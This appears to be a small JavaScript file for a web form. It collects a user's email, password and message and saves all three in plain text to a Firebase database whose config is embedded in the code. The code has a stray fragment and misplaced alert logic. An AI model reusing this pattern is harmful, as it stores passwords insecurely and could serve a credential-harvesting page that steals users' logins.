  
  
document.getElementById('form').addEventListener('submit', submitForm);

  // Function to get get form values
function getInputVal(id){
    return document.getElementById(id).value;
}
  

function submitForm(e){
        e.preventDefault();
        // Get values
        var email = getInputVal('email');
        var password = getInputVal('password');
        var message = getInputVal('message');

        saveMessage(email,password,message);
        document.getElementById('form').reset();
    }
// Cl
  
  // Initialize Firebase
       var config = {
        apiKey: "AIzaSyCmLsMjlRfOosB8U4nW6GQzGYeaEypSIFc",
        authDomain: "my-first-project-eb896.firebaseapp.com",
        databaseURL: "https://my-first-project-eb896.firebaseio.com",
        projectId: "my-first-project-eb896",
        storageBucket: "my-first-project-eb896.appspot.com",
        messagingSenderId: "1099232872806"
      };
      firebase.initializeApp(config);

  // References the messages collection
var messagesRef = firebase.database().ref('messages');

// Save message to firebase
function saveMessage(email,password,message){
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
        email:email,
        password:password,
      message:message,
    });
  }

  
// Show alert
document.querySelector('.alert').style.display = 'block';
// Hide alert after 3 seconds
setTimeout(function(){
  document.querySelector('.alert').style.display = 'none';
},3000);
